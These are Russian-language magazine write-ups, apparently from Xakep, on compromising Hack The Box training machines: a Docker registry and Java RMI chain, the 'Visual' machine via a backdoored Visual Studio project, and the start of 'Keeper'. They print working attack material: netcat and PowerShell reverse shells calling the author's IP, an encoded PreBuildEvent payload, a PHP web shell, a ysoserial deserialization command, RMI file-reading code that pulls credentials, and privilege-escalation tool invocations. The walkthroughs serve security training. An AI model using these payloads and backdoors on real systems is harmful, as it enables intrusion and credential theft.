python3 DockerGraber_token.py --list https://webhosting.htb -T
eyJ0eXAi...





                     Спи сок репози тори ев

Те перь сдам пим весь репозиторий на свой хост, для чего передаем наз вание
репози тория в параметре --dump.


python3 DockerGraber_token.py --dump hosting-app https://webhosting.
htb -T eyJ0eXA





                      Дамп репози тория

По лучаем сообщение об ошибке, так как у этого токена нет разрешений
на дамп репози тори ев. Нуж но запросить новый токен, для чего сно ва обра-
щаем ся к API /v2/hosting-app/tags/list и получаем параметры из HTTP-
заголов ка.


curl -k -s https://webhosting.htb:5000/v2/hosting-app/tags/list -v |
jq





                        Ответ сервера


curl -k -s 'https://webhosting.htb:5001/
auth?service=Docker%20registry&scope=repository:hosting-app:pull' |
jq





                         Запрос токена


python3jwt_tool.py eyJ0eXAiOiJKV1Q....

Повторно дампим репозиторий hosting-app с новым токеном, на этот раз
успешно.


python3 DockerGraber_token.py --dump hosting-app https://webhosting.
htb -T eyJ0eXAiOiJKV1Q...





                      Дамп репози тория

Пос ле загрузки всех архи вов переходим к анализу файлов. Их у нас теперь
очень много, поэтому нужно опре делить, что из это го будет нам полезно.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          ЭКСПЛУАТИРУЕМ УЯЗВИМОСТИ
           JAVA RMI ДЛЯ ПОЛНОГО ЗАХВАТА
                             ХОСТА





ÒÎ×ÊÀ ÎÏÎÐÛ

В самом первом архи ве  (0bf45c...79d0ba) находим файл hosting.ini
с паролем для MySQL. Он может пригодиться.





                 Содержимое файла hosting.ini

А вот в архиве 4a19a0...82ac42 лежит весь каталог Apache Tomcat, что дает
нам доступ к исходно му коду сай та.





                 Содержимое каталога tomcat

Больше все го нас интересует каталог webapps, содержащий исходники
работа ющих на сервере веб-при ложений, где и находим модуль hosting.





                 Содержимое каталога hosting

Те перь можно перей ти к ана лизу самого сай та.


Apache Tomcat — path traversal
Ре гистрируемся и авто ризу емся на сайте, чтобы получить доступ ко всем воз-
можнос тям.





            Главная стра ница авто ризо ванного пользователя

При тестировании сай тов на Tomcat всег да сто ит проверять, нет ли уяз вимос-
ти обхо да катало га.


https://www.webhosting.htb/hosting/..;/examples/





                     Ре зультат про вер ки пути

Мы узнали, что уязвимость  есть, поэтому сразу перей дем  к стра нице
Servlets examples.





                     Страница Servlets examples

Эта страница откры вает богатей шие воз можнос ти для манипулирования дан-
ными сессий и даже сайта.
  Пришло вре мя перейти к анализу кода обнаружен ного ранее модуля. Так
как это приложе ние на Java, для его ревер са я буду использовать Recaf.
  В клас се AuthenticationServlets видим, что пользователь может быть
менеджером, за что отвечает атрибут сес сии s_IsLoggedInUserRoleManager
(стро ки 43–45).





         Де ком пилированный код клас са AuthenticationServlets

Су дя по классу ConfigurationServlet, можно делать настройки. Дос туп
к этим функциям име ет как раз пользователь с ролью менеджера (строки 42–
46).





         Декомпилированный код класса CongurationServlet

Один из сервле тов Tomcat позволяет манипулировать атри бутами сессий.
Давай    акти вируем    роль    менед жера,    для    чего    атрибуту
s_IsLoggedInUserRoleManager установим зна чение true.


https://www.webhosting.htb/hosting/..;/examples/servlets/servlet/
SessionExample





                 Страница сервлета SessionExample





                   Установленные атрибуты сес сии


RCE ÷åðåç Java RMI
Те перь мож но перей ти к новой странице /hosting/reconfigure и отправить
запрос на сох ранение изменений. Это нужно, чтобы получить парамет ры зап-
роса и найти эту функцию в исходниках приложения.





                       Страница /recongure





                 Зап рос для сохранения изменений

На прош лом скриншоте исходного кода клас са ConfigurationServlet нас
интересует обработчик doPost (строки 28–38). В зависимости от полученных
парамет ров управление дальше передается раз ным обра ботчикам.  Так,
парамет ры domains.max и domains.start-template упомина ются только
в клас се DomainServlet (строки 49–62).





                Исходный код класса DomainServlet

При этом в стро ках 59 и 60 вызывается метод get класса RMIClientWrapper.
В коде этого метода также отыскался параметр rmi.host, который в запросе
не передавался.





              Исходный код класса RMIClientWrapper

Видимо, если мы отправим адрес хоста в параметре rmi.host, сервер
выполнит зап рос по это му адресу. В коде видим филь тр, который про веряет,
окан чивается ли адрес подстро кой .htb. Этот фильтр мы можем обой ти,
используя нулевой байт %00. Запус каем лис тенер (nc -nlvp 9002) и выпол-
няем зап рос.





                        Зап рос на сервер





                       Логи листенера

И момен тально в окне листенера видим входящий запрос RMI.
  Java RMI — это механизм, который поз воляет вызывать метод удален-
ного объ екта, даже на другом сер вере. В некоторых вариантах такое подклю-
чение может привести даже к RCE, так как переда ются и выполняются сери-
ализованные данные.
  Попробуем  использовать  готовый  эксплоит.  Для  этого  запускаем
ysoserial в режиме листенера, который при мет запрос и вернет нагрузку,
выполняющую реверс-шелл. Также запускаем листенер (rlwrap nc -nlpv
4321), чтобы принимать соединение от реверс-шелла.


/usr/lib/jvm/java-11-openjdk-amd64/bin/java -cp ysoserial-all.jar
ysoserial.exploit.JRMPListener 9002 CommonsCollections6 'nc 10.10.16.
29 4321 -e /bin/bash'

Когда все готово, повторяем запрос в Burp Repeater и получаем сначала
запрос RMI, а затем и бэкконнект.





                        Ло ги ysoserial





                    Сессия поль зователя app




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          ЭКСПЛУАТИРУЕМ УЯЗВИМОСТИ
           JAVA RMI ДЛЯ ПОЛНОГО ЗАХВАТА
                             ХОСТА





ÏÐÎÄÂÈÆÅÍÈÅ

Су дя по ограничениям командной оболочки, мы попали в контей нер Docker.
Так как на хосте работает Java RMI, эксплу ата ция уязвимос тей в этом
механизме — наибо лее веро ятный путь для продвижения. Сре ди открытых
пор тов видим 9002.


netstat -tulpan





                     Прос лушиваемые порты

Для доступа к пор ту нужно сделать туннель, к при меру с помощью chisel.
На своем хосте запускаем режим сервера, ожи дающий подключения к пор-
ту 5432.


./chisel.bin server -p 5432 --reverse

На удаленном хосте — режим кли ента, которо му указыва ем адрес для под-
ключения, а также настрой ку туннеля socks.


./chisel.bin client 10.10.16.29:5432 R:127.0.0.1:socks

В логах сервера мы должны уви деть созданную сес сию.





                      Логи сервера chisel

Для  исследования  RMI-при ложе ний  я  использую  инс трумент remote-
method-guesser. Для первой проверки задаем опцию enum, а чтобы нап-
равить трафик в соз данный туннель, в конец файла /etc/proxychains.conf
добавляем запись socks5 127.0.0.1 1080.


proxychains -q /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar rmg-
4.4.1-jar-with-dependencies.jar enum 127.0.0.1 9002





                     Резуль тат про верки RMI

Нам дос тупны два класса: QuarantineService и FileService. О первом ска-
зать нечего, а вот FileService уже при сутство вал в исследованном ранее
при ложе нии.





               Исходный код интерфей са FileService

Интерфейс содер жит мно го методов, скорее все го, для работы с файловой
системой. Попробуем най ти вызовы метода list, видимо, отображающего
содержимое переданного катало га (строка 18).





                   Исходный код класса FileUtil

Пе реходим к слож ной час ти. Нужно будет написать свое приложение, исполь-
зующее тот же интерфейс, при этом нуж но под клю чаться к RMI и вызывать
метод list на удаленном хос те. В качес тве среды разработки я буду исполь-
зовать Intellij IDEA.
   Рас пакуем  полученное  приложение,  уда лим  из  него  файл  класса
RMIClientWrapper и создадим новый про ект со сво ей реализацией. Копиру-
ем ста рый код, в методе get явно ука зываем адрес сервера, а также добав-
ляем функцию main, получающую спи сок файлов.


public class RMIClientWrapper {
   private static final Logger log = Logger.getLogger(
RMIClientWrapper.class.getSimpleName());


   public static FileService get() {
       try {
           String rmiHost = "registry.webhosting.htb";
           System.setProperty("java.rmi.server.hostname", rmiHost);
           System.setProperty("com.sun.management.jmxremote.rmi.port"
, "9002");
           Registry registry = LocateRegistry.getRegistry(rmiHost,
9002);
           return (FileService)registry.lookup("FileService");
       } catch (Exception e) {
           e.printStackTrace();
           throw new RuntimeException(e);
       }
   }


   public static void main(String args[]) {
       try {
           String dir = "/";
           List<AbstractFile> files = get().list("950ba61ab119", dir)
;


           System.out.println("=================================");
           System.out.println("Listing: " + dir);
           for( AbstractFile file : files ) {
               System.out.println( file.getAbsolutePath() );
           }
           System.out.println("=================================");
       } catch (RemoteException e) {
           e.printStackTrace();
       };
   }
}

Для работы это го кода добавляем в наш файл реали зацию дру гих затронутых
классов и методов. Импорты среда разработ ки подтянет автоматически.


class AbstractFile implements Serializable {
   private static final long serialVersionUID = 2267537178761464006L;
   private final String fileRef;
   private final String vhostId;
   private final String displayName;
   private final File file;
   private final String absolutePath;
   private final String relativePath;
   private final boolean isFile;
   private final boolean isDirectory;
   private final long displaySize;
   private final String displayPermission;
   private final long displayModified;
   private final AbstractFile parentFile;


   public boolean isFile() {
       return this.isFile;
   }


   public String getName() {
       return this.file.getName();
   }


   public boolean canExecute() {
       return this.getFile().canExecute();
   }


   public boolean exists() {
       return this.isFile || this.isDirectory;
   }


   public AbstractFile(String fileRef, String vhostId, String
displayName, File file, String absolutePath, String relativePath,
boolean isFile, boolean isDirectory, long displaySize, String
displayPerm
ission, long displayModified, AbstractFile parentFile) {
       this.fileRef = fileRef;
       this.vhostId = vhostId;
       this.displayName = displayName;
       this.file = file;
       this.absolutePath = absolutePath;
       this.relativePath = relativePath;
       this.isFile = isFile;
       this.isDirectory = isDirectory;
       this.displaySize = displaySize;
       this.displayPermission = displayPermission;
       this.displayModified = displayModified;
       this.parentFile = parentFile;
   }


   public String getFileRef() {
       return this.fileRef;
   }


   public String getVhostId() {
       return this.vhostId;
   }


   public String getDisplayName() {
       return this.displayName;
   }


   public File getFile() {
       return this.file;
   }


   public String getAbsolutePath() {
       return this.absolutePath;
   }


   public String getRelativePath() {
       return this.relativePath;
   }


   public boolean isDirectory() {
       return this.isDirectory;
   }


   public long getDisplaySize() {
       return this.displaySize;
   }


   public String getDisplayPermission() {
       return this.displayPermission;
   }


   public long getDisplayModified() {
       return this.displayModified;
   }


   public AbstractFile getParentFile() {
       return this.parentFile;
   }
}


interface FileService extends Remote {
   public List<AbstractFile> list(String var1, String var2) throws
RemoteException;


   public boolean uploadFile(String var1, String var2, byte[] var3)
throws IOException;


   public boolean delete(String var1) throws RemoteException;


   public boolean createDirectory(String var1, String var2) throws
RemoteException;


   public byte[] view(String var1, String var2) throws IOException;


   public AbstractFile getFile(String var1, String var2) throws
RemoteException;


   public AbstractFile getFile(String var1) throws RemoteException;


   public void deleteDomain(String var1) throws RemoteException;


   public boolean newDomain(String var1) throws RemoteException;


   public byte[] view(String var1) throws RemoteException;
}

Те перь перехо дим к функции main и рядом с ее опре делением нажимаем
кнопоч ку запуска приложения.





                Реали зация класса RMIClientWrapper





               Ошибка при запус ке приложе ния

Но при запуске видим ошибку соеди нения, так как приложение не может
получить доступ к порту в обход туннеля. Давай прос то скопиру ем строку
запуска и запустим программу в консоли, но уже через proxychains.





                   Резуль тат работы приложения

И получаем содер жимое каталога при ложения! Теперь мы можем просматри-
вать файловую систему удаленного сервера, прос то меняя в нашем приложе-
нии переменную dir. Давай просмотрим домаш ние каталоги пользователей.





                 Содержимое каталога /home





              Содержимое катало га /home/developer

Находим все го одного пользователя с домаш ним каталогом, где есть очень
интерес ный файл .git-credentials. Теперь получим его содержимое,
для чего будем исполь зовать метод view. Давай допол ним функцию main
и для про бы про чита ем файл /etc/passwd.


   public static void main(String args[]) {
       try {
           String dir = "../../../../home/developer/";
           List<AbstractFile> files = get().list("950ba61ab119", dir)
;
           System.out.println("=================================");
           System.out.println("Listing: " + dir);
           for( AbstractFile file : files ) {
               System.out.println( file.getAbsolutePath() );
           }
           System.out.println("=================================\n");



           String filename = "/etc/passwd";
           System.out.println("Content " + filename + " :");
           byte[] byteContent = get().view(filename);
           String content = new String( byteContent, StandardCharsets
.UTF_8 );
           System.out.println(content);
       } catch (RemoteException e) {
           e.printStackTrace();
       };
   }





                    Результат выполнения кода

Во вре мя чтения файла получаем ошибку, разоб раться с которой у меня дол-
го не выходи ло, пока на форуме мне не ука зали на то, что имя фай ла шиф-
руется перед отправ кой. Тог да код функции main приобре тает следующий
вид.


   public static void main(String args[]) {
       try {
           String dir = "../../../../home/developer/";
           List<AbstractFile> files = get().list("950ba61ab119", dir)
;
           System.out.println("=================================");
           System.out.println("Listing: " + dir);
           for( AbstractFile file : files ) {
               System.out.println( file.getAbsolutePath() );
           }
           System.out.println("=================================\n");



           String filename = "/etc/passwd";
           System.out.println("Content " + filename + " :");
           CryptUtil cryptUtil = new CryptUtil();


           byte[] byteContent = get().view(cryptUtil.encrypt(filename
));
           String content = new String( byteContent, StandardCharsets
.UTF_8 );
           System.out.println(content);


       } catch (RemoteException e) {
           e.printStackTrace();
       };
   }

Добав ляем в файл код клас са CryptUtil.


class CryptUtil {
   public static CryptUtil instance = new CryptUtil();
   Cipher ecipher;
   Cipher dcipher;
   byte[] salt = new byte[]{-87, -101, -56, 50, 86, 53, -29, 3};
   int iterationCount = 19;
   String secretKey = "48gREsTkb1evb3J8UfP7";


   public static CryptUtil getInstance() {
       return instance;
   }


   public String encrypt(String plainText) {
       try {
           PBEKeySpec keySpec = new PBEKeySpec(this.secretKey.
toCharArray(), this.salt, this.iterationCount);
           SecretKey key = SecretKeyFactory.getInstance(
"PBEWithMD5AndDES").generateSecret(keySpec);
           PBEParameterSpec paramSpec = new PBEParameterSpec(this.
salt, this.iterationCount);
           this.ecipher = Cipher.getInstance(key.getAlgorithm());
           this.ecipher.init(1, key, paramSpec);
           String charSet = "UTF-8";
           byte[] in = plainText.getBytes("UTF-8");
           byte[] out = this.ecipher.doFinal(in);
           String encStr = Base64.getUrlEncoder().encodeToString(out)
;
           return encStr;
       }
       catch (Exception e) {
           throw new RuntimeException(e);
       }
   }


   public String decrypt(String encryptedText) throws
NoSuchAlgorithmException, InvalidKeySpecException,
NoSuchPaddingException, InvalidKeyException,
InvalidAlgorithmParameterException, UnsupportedEnco
dingException, IllegalBlockSizeException, BadPaddingException,
IOException {
       PBEKeySpec keySpec = new PBEKeySpec(this.secretKey.toCharArray
(), this.salt, this.iterationCount);
       SecretKey key = SecretKeyFactory.getInstance(
"PBEWithMD5AndDES").generateSecret(keySpec);
       PBEParameterSpec paramSpec = new PBEParameterSpec(this.salt,
this.iterationCount);
       this.dcipher = Cipher.getInstance(key.getAlgorithm());
       this.dcipher.init(2, key, paramSpec);
       byte[] enc = Base64.getUrlDecoder().decode(encryptedText);
       byte[] utf8 = this.dcipher.doFinal(enc);
       String charSet = "UTF-8";
       String plainStr = new String(utf8, "UTF-8");
       return plainStr;
   }
}





                    Результат выполнения кода

Код работает, теперь у нас есть воз можность читать фай лы. Вер немся к фай-
лу .git-credentials.





               Содержимое файла .git-credentials

С получен ными учетными данными авто ризу емся по SSH и забираем первый
флаг.





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          ЭКСПЛУАТИРУЕМ УЯЗВИМОСТИ
           JAVA RMI ДЛЯ ПОЛНОГО ЗАХВАТА
                             ХОСТА





ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Мы в системе, пора собирать информацию! Я, как всегда, загружу и запущу
на целевом хос те PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Прос матри ваем вывод скрип та и подмеча ем, что в каталоге /opt есть соз-
данный пользователем файл registry.jar.





               Фай лы, добавленные поль зователем

Информации мало, поэтому проследим, запускается ли этот файл. Для отсле-
живания запускаемых процессов в системе мы будем исполь зовать ути литу
pspy64. В выводе находим запуск другого фай ла — quarantine.jar. Но, что
более инте ресно, он запус кается в кон тексте пользовате ля с UID=0, а это
root.




                   Вывод утилиты pspy64

Скачиваем оба файла на свой хост для анализа.


scp developer@webhosting.htb:/usr/share/vhost-manage/includes/
quarantine.jar ./
scp developer@webhosting.htb:/opt/registry.jar ./

Начинаем с файла, который запускается. В функции Main соз дается объект
класса Client и вызывается метод scan (стро ка 10).





                   Ис ходный код класса Main

Этот класс дос тупен и через RMI. Пос ле подклю чения к пор ту 9002 происхо-
дит  получение  конфигурации,  которая передается конс труктору  клас са
ClamScan (стро ки 28–31). В методе scan программа получает список файлов,
каждый из которых передается в метод doScan (стро ки 35–43).





                   Исходный код клас са Client

В конфиге ука зан каталог для ска нирования и каталог, видимо, для резуль-
татов сканирования, а также хост, порт и тайм-аут для под ключения (стро-
ки 10–14).





            Исходный код класса QuarantineConguration

Пе реходим к методу doScan, где стоит обра тить вни мание на строки 69,
70 и 77. Если при сканировании метод scanPath клас са ClamScan вернет
FAILED, то файл передается на карантин, где и про исходит копирование фай-
ла.





             Исходный код клас са Client (продолжение)

Пе рейдем к классу ClamScan и взглянем на метод scanPath. Первым делом
он под клю чается к ука занному в конфигура ции адресу (строки 163–165).
Отправ ляется лишь информа ция о сканируемом файле (строки 204–205).





             Исходный код клас са Client (продолжение)





                 Исходный код клас са ScanResult

Те перь перей дем к фай лу сервера RMI. Сер вер при нима ет соединение
и передает конфиги.





                        Код класса Server

Создание кон фига с параметрами находим в классе QuarantineServerImpl.





                  Код клас са QuarantineServerImpl

Выходит, что если мы смо жем запустить свой сервер и передать свои кон-
фиги для сканирования, то у нас появит ся возможность скопировать все фай-
лы из произвольного каталога. Конечно же, нам интересен каталог поль-
зователя root. Еще раз запус каем pspy64, чтобы отследить, происходит ли
запуск фай ла сер вера.




                         Логи pspy64

В логах находим пери одический перезапуск файла сервера, а значит, мы
можем успеть запустить свою версию.
  В этот раз мы не будем заново писать код, а изменим в уже собранном
файле все го одну строку в клас се QuarantineServerImpl, где происходит
установка кон фига. Это строка 15.


private static final QuarantineConfiguration DEFAULT_CONFIG = new
QuarantineConfiguration(new File("/tmp/quarantine"), new File("/root/
"), "10.10.16.29", 3310, 1000);

Указываем  каталог  /root/  для  сканирования  и  копирования фай лов
в каталог/tmp/quarantine. Затем в меню деком пилятора выбира ем File →
Export Program и сохраня ем новый файл JAR. Копируем его на удаленный
сервер и запускаем в цикле. Как только сервер запустится, получим соответс-
твующее сообщение.


while true;do java -jar registry_new.jar 2>/dev/null;done




                       Запуск сервера RMI

Для получе ния логов на локальном хосте откроем порт 3310.


socat -d -d TCP4-LISTEN:3310,reuseaddr,fork STDOUT




                      Ло ги сканирования

В логах снова видим файл .git-credentials. Давай найдем его на сервере.


find ./ -name * git*





                 Каталоги с отчетами о ска ниро вании





               Содержимое файла .git-credentials

С полученным паролем авто ризуемся от имени root и забира ем пос ледний
флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как проникнуть
на хост через бэкдор в нас тройках про екта
Visual   Studio.  Затем  получим  сес сию
от имени служ бы веб-сервера, активиру ем
привилегию SeImpersonate и используем             RalfHacker                                                                                             hackerralf8@gmail.com
оче редную  «картошку»  для  выполнения
кода от име ни системы.


Наша цель — получение прав суперпользователя на машине Visual с учебной
пло щадки Hack The Box. Уровень сложности машины — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.234   visual.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел только один открытый порт — 80 (веб-сервер Apache 2.4.56),
что для Windows крайне нехарак терно. Давай взглянем на сайт, с которым
нам предсто ит работать.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На сайте есть форма вставки URL и Git-репозиторий. Давай для теста запус-
тим локальный веб-сервер и посмотрим, что будет, если вставить в поле
для ссылки его адрес.


python3 -m http.server 80

Мы получаем лог сборки проекта.





                            Лог сборки





                      Ло ги веб-сервера

На сай те указано, что используется язык раз работки C# и среда Visual Studio,
а значит, ожидается, что пользователь вста вит адрес репозитория с проектом
на C#. Давай подготовим такой репозиторий.
  Поднимаем виртуалку с Windows и ставим Visual Studio. Теперь создадим
прос той консоль ный проект C# и скопиру ем его пап ку на свой основной хост.





                     Струк тура про екта Visual Studio

Те перь нужно создать Git-репозиторий. Инициализировать пустой репози-
торий можно командой git init в каталоге с проектом.





                    Соз дание Git-репозитория

Те перь командой git add нужно добавить каталог проекта в репозиторий
и создать ком мит с любым именем, к примеру e1:


git commit -m e1

В конце обновляем информацию о сервере командой git update-server-
info.





               Добавление файлов в репози торий

Когда все готово, в текущем катало ге сно ва запускаем веб-сервер и отправ-
ляем адрес репозитория:


http://10.10.16.91/.git





                      Ло ги веб-сервера





                         Логи сборки

Сборка проекта прош ла успешно, а значит, мы можем перей ти к сле дующей
ста дии — получе нию удаленного выполнения кода.


ÒÎ×ÊÀ ÎÏÎÐÛ

Су ществует несколь ко спо собов выполнить код, манипу лируя нас трой ками
сборки проектов Visual Studio. Обыч но такие трюки при меняют при целевых
фишин говых  атаках,  нап равленных  на  раз работчиков. Самый  простой
из них — это задания перед сборкой и после.
  В блоке PropertyGroup можно объявить параметры PreBuildEvent
и PostBuildEvent соответс твенно, которые указывают, какую команду нужно
выполнить в системе. Запустим листенер:


rlwrap nc -nlvp 4321

И закоди руем в Base64 следующий реверс-шелл на PowerShell.


$client = New-Object System.Net.Sockets.TCPClient("10.10.16.91",4321)
;
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).
GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()};
$client.Close()

Затем изменим файл с нас тройками проекта evil.csproj, добавив задания
предсборки.


<PreBuildEvent>powershell -e JABjAGwAaQ.....AApAA==</PreBuildEvent>





                 Со держимое файла evil.csproj

При меним изме нения в репозитории, выполним коммит и отпра вим ссыл ку
на репози торий заново.


git add evil/evil.csproj
git commit -m "e2"
git update-server-info





                   Фик сация изменений в Git





                         Логи сборки

По лучаем сообщение о том, что время ожи дания истекло, при этом в окне
листенера netcat появ ляется бэкконнект. Значит, у нас получи лось попасть
в систему!





                        Сессия в netcat


ÏÐÎÄÂÈÆÅÍÈÅ

Сна чала просматриваем домашние катало ги пользователей. Так, из обычных
юзе ров в системе есть только enox, с его рабоче го стола и забира ем первый
флаг.





                       Флаг пользователя

Об рати внимание, что реверс-шелл запущен из каталога с загруженными
на веб-сервер файлами. Прос матри вая корневой каталог веб-сер вера,
находим и файлы самого сай та.





              Содержимое каталога C:\xampp\htdocs

Ве роятно,  у этого пользователя есть при виле гии на запись в каталог
веб-сервера. Про верить это очень просто, нуж но лишь попытаться соз дать
какой-нибудь файл.





                       Запись фай ла test

Файл успешно создан, а значит, мож но загрузить на сер вер веб-шелл
для выполнения команд и получить новую сессию от имени пользователя
службы веб-сер вера. У этой учетки будут допол нитель ные при вилегии в срав-
нении с учетными запися ми простых пользователей.
  Записы вать будем самый простой веб-шелл на PHP. На локальной машине
создадим файл с таким содер жимым:


<?php system($_GET['c']); ?>

Те перь запустим веб-сервер (python3 -m http.server -p 80) и скачаем
шелл на удаленный хост.


wget 10.10.16.91/shell.txt -O C:\xampp\htdocs\rcmd.php

Те перь мож но обращать ся к веб-шеллу через curl, к при меру выполнить
коман ду whoami.


curl 'http://visual.htb/rcmd.php?c=whoami'





               Ре зультат выполнения команды whoami

Давай снова запустим лис тенер и выполним тот же реверс-шелл, что исполь-
зовали раньше.





                Сессия пользователя Local Service

По лучаем сессию в контексте Local Service и идем повышать привилегии.


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Учетные записи LOCAL SERVICE и NETWORK SERVICE настро ены на запуск
с ограниченным набором привилегий, чтобы при ком промета ции этих учетных
записей атакующий не получал опас ных при виле гий SeAssignPrimaryToken
и SeImpersonate.


whoami /all





                 Информация об учетной записи

Однако, если про цесс создан службой планировщика задач, он бу дет иметь
все при вилегии, которые по умолчанию связаны с учетной записью.
  Для авто мати ческой эксплуата ции воспользуемся ути литой FullPowers.
Будем выпол нять наш реверс-шелл, но направим на другой порт.


.\fp.exe -c "powershell -e JABjAGw..."





                       Ло ги FullPowers

На новый листенер при летает сес сия, и теперь у пользовате ля активны все
нуж ные нам при виле гии.





               Новая сессия со всеми привилегиями

В том числе включена привилегия SeImpersonatePrivilege (право «олицет-
ворять клиента пос ле проверки подлинности»). Вот что о ней сказано
в документации:

     Ïðèñ âîåíèå ïîëüçîâàòå ëþ ïðà âà «Îëèöåòâîðÿòü êëèåíòà ïîñ ëå ïðî-
      âåð êè ïîä ëèííîñ òè» ðàç ðåøà åò ïðîãðàììàì, çàïóùåííûì îò èìå íè«
      äàííîãî ïîëüçîâàòå ëÿ, îëèöåòâîðÿòü êëèåíòà. Èñïîëüçîâàíèå äàííîãî
      ïàðàìåòðà ïðå äîòâðà ùàåò îëèöåòâîðåíèå íåàâ òîðèçîâàííûìè ñåð-
      âåðàìè êëèåíòîâ, ïîä êëþ ÷àþùèõñÿ ê ýòèì ñåð âåðàì ñ ïîìîùüþ ïðî-
      öåäóð RPC èëè èìå íîâàííûõ êàíàëîâ.                »
Другими словами: эта привилегия позволяет имитировать любой токен, дес-
крип тор которо го мы сможем получить. Для этого исполь зуем пос леднюю
на данный момент «картошку» — GodPotato. Сно ва выпол няем реверс-шелл
и получаем сессию от имени SYSTEM.


.\gp.exe -cmd "powershell -e JABjAGwAaQ..."





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как можно восста-
новить  мастер-пароль  от  базы  дан ных
парольного менед жера KeePass из дампа
памяти процесса, чтобы получить учетные
дан ные и ключи. На пути к это му по тра-             RalfHacker                                                                                             hackerralf8@gmail.com
диции попентестим веб-сервис и соберем
дан ные для продвижения.


Наша цель — получение учет ной записи суперполь зователя на машине
Keeper с учеб ной площадки Hack The Box. Уро вень сложности машины — лег-
кий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.227    keeper.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Nginx 1.18.0.

SSH, как обычно, пока оставляем в покое, пос коль ку учет ных данных у нас нет.
Пойдем искать уязвимос ти в веб-сайтах.


ÒÎ×ÊÀ ÂÕÎÄÀ

На веб-сервере нас встречает ссылка на служ бу поддер жки, ведущая на дру-
гой поддомен: tickets.keeper.htb.





                   Главная страница сай та keeper.htb

Но вый поддомен тоже добав ляем в файл /etc/hosts.


10.10.11.227 keeper.htb tickets.keeper.htb





               Стра ница авто ризации tickets.keeper.htb

Те перь перей дем по ссылке. На новом сайте нас встре чает страница авто-
ризации системы заявок Request Tracker. Поиск эксплоитов ничего не дал,
а типич ная пара учетных данных admin:admin оказалась невалидной. Однако
всег да сто ит проверять еще и учетные данные, заданные в том или ином
ПО по умол чанию. Для Request Tracker это root:password, что я узнал
из офи циальной вики.





            Wiki-стра ница Request Tracker — RecoverRootPassword

C дефолтны ми логином и паролем авто ризу емся в Request Tracker, при этом,
как оказалось, сразу от имени привилегирован ного пользовате ля.





                Глав ная страница сайта tickets.keeper.htb

В любых системах, связанных с тикетами и про чими заявками, первым делом
нуж но искать по словам вро де pass, secret, login, token. В данном слу чае
при поиске подс троки pass отыскивается всего один тикет. Какие-то проб-
лемы с кли ентом KeePass для Windows.





              Поиск заявок, где упо мина ются пароли

К сожале нию, ничего существенного не находим. Комментарии к заявке тоже
никакой полезной информации не содержат.





                      Описание заявки


ÒÎ×ÊÀ ÎÏÎÐÛ

В меню переходим по пути Admin → Users → Select и получа ем спи сок сущес-
твующих в системе поль зователей.





                  Меню системы тикетов





                 Список пользователей системы

Как минимум уже нашли имя поль зователя.
   Те перь открываем профиль каждого пользователя и собираем информа-
цию.  Воз можно,  по  ней  получится  сге нери ровать  список  паролей
